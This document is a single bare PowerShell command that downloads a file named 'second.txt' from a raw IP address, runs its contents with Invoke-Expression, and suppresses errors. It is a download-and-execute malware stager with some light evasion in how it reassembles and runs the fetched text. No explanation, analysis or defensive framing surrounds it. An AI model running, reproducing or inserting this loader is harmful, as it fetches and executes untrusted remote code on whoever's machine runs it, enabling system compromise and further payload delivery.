${g}=[char[]](New-Object Net.WebClient).DownloadString('http://151.61.206.201/second.txt');iex(${g}-join'');&{Start-Sleep -s 1.2;$ErrorActionPreference='SilentlyContinue'}
